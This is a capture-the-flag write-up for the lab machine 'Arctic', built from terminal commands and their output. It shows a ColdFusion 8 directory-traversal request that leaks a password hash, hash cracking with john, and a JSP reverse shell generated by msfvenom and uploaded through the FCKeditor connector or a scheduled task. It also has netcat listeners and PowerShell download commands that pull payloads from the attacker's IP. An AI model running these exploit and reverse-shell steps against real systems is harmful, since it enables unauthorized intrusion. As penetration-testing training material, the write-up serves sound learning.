## ----------->> Arctic <<-----------

// First we start with nmap scan

    $ nmap -sV -A -Pn 10.10.10.11 -p-
-----

    Nmap scan report for 10.10.10.11
    Host is up (0.13s latency).
    Not shown: 65532 filtered ports
    PORT      STATE SERVICE VERSION
    135/tcp   open  msrpc   Microsoft Windows RPC
    8500/tcp  open  fmtp?
    49154/tcp open  msrpc   Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// navigate to http://10.10.10.11:8500 gets us to 2 directories

![Image 1]()

// after digging, we navigate to login page of Adobe ColdFusion==> http://10.10.10.11:8500/CFIDE/administrator/

![Image 2]()

// searching in exploit-db we found CVE-2010-2861 Adobe ColdFusion - Directory Traversal 

![Image 3]()

// Also there is some exloits i found with searsploit(We will save that for later)

![Image 12]()

// in the CVE what cougth my eye:

![Image 4]()

    .............................................
    # Working GET request courtesy of carnal0wnage:
    # http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
    .....................................................

// navigating to save directory in our server

    http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

// gets us output on the web page

![Image 5]()

    #Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true

    #Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 


// crack the hash using john

// First save the hash to file clled 'hash'

    $ cat hash 
    2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

// run john on hash file

    $ john test1.txt 
    Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
    Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
    Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
    Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
    Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
    Use the "--format=ripemd-160" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 ASIMD 4x])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
    happyday         (?)
    1g 0:00:00:00 DONE 2/3 (2021-08-05 15:07) 16.66g/s 24266p/s 24266c/s 24266C/s happy123..harley1
    Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
    Session completed

-----

    2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 ===>> [sha1]	happyday


// log into http://10.10.10.11:8500/CFIDE/administrator/
// redirects us to http://10.10.10.11:8500/CFIDE/administrator/index.cfm

![Image 6]()

// JSP stands for Java Server Pages. and seens CloudFusion is java program .jsp its the file format we can upload.

// we will do that with msfvenom

    $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.8 LPORT=1444 -f raw > exp.jsp
    Payload size: 1498 bytes


###### == Upload reverse shell payload: way 1 ==

// When we was searching for exploits with searsploit i notice ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)

![Image 13]()

// In the description we can see the values and method for upload the file 

    $ searchsploit -x cfm/webapps/16788.rb
-----

    .......

    dbl = Rex::MIME::Message.new
    dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
    file = dbl.to_s
    file.strip!

    print_status("Sending our POST request...")

    res = send_request_cgi(
        {
          'uri'           => "#{datastore['FCKEDITOR_DIR']}",
          'query'         => "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
          'version'       => '1.1',
          'method'        => 'POST',
          'ctype'         => 'multipart/form-data; boundary=' + dbl.bound,
          'data'          => file,
          }, 5)

    ........
    
// Upload our payload curl POST method

    curl -X POST -F newfile=@exp.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exp.jsp%00'

// Open a listiner with nc

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...

// Navigate to 

    http://10.10.10.11:8500/userfiles/file/OPVDTDQK.jsp

// We got a shell !!!

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.11] 49513
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\ColdFusion8\runtime\bin>


###### == Upload reverse shell payload: way 2 ==

// Digging the administrator dashboed we see option called Scheduled Tasks there we can upload a New Tasks in the Schedule Tasks

![Image 8]()

// We can check directories mapping by navigate ==> Server Settings > Mappings 

![Image 7]()

// Now we can fill the New Task, Click again on 'Sheduled Tasks' >> 'Shedule New Task'

    URL   ==>>  http://10.10.17.8/exp.jsp
    File  ==>>  C:\ColdFusion8\www\root\CFIDE\

    ==> Submit


// before run schedule open python http server for obtain the downloaded payload

    $ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

// Open a listiner with nc

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...

// run new schedule

    $ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.11 - - [07/Jul/2021 23:23:52] "GET /exp.jsp HTTP/1.1" 200 -

// Navigatin to http:10.10.10.11:8500/ , we can see a new directory called /userfiles

![Image 10]()

// There we could find the file we uploaded (with strange name) -> click on that file

![Image 11]()

// And, We got a shell !!!

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.11] 49513
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\ColdFusion8\runtime\bin> whoami
    arctic\tolis

// and user flag !!

    C:\Users\tolis\Desktop> type user.txt
    02650d3.................



-----------------------------------Search exploits(Method 1)------------------------------------------------

$ python windows-exploit-suggester.py --database 2021-07-08-mssb.xls --systeminfo sysinfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

---------------------------------------------------------------------------------------------------------------------
-----------------------------------Search exploits(Method 2)---------------------------------------------------------

$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.238 LPORT=1444 -f exe > msf_handler.exe​

powershell "(new-objectSystem.Net.WebClient).Downloadfile('http://10.10.16.238/msf_handler.exe', 'msf_handler.exe')"

New-ObjectSystem.Net.WebClient.Downloadfile('http://10.10.16.238/msf_handler.exe', 'msf_handler.exe')



-----------------------------------------------------------------------------------------------------------------------------
---------------Moving file with powershell commands(didnt work for me)----------------
// move file using shell comands
echo $client = New-Object System.Net.WebClient >>lrm.ps1
echo $url = "http://10.10.16.238/MS11-011.exe" >>lrm.ps1
echo $exp = exp.exe >>lrm.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File lrm.ps1









root.txt
ce65ceee66b2b5ebaff07e50508ffb90
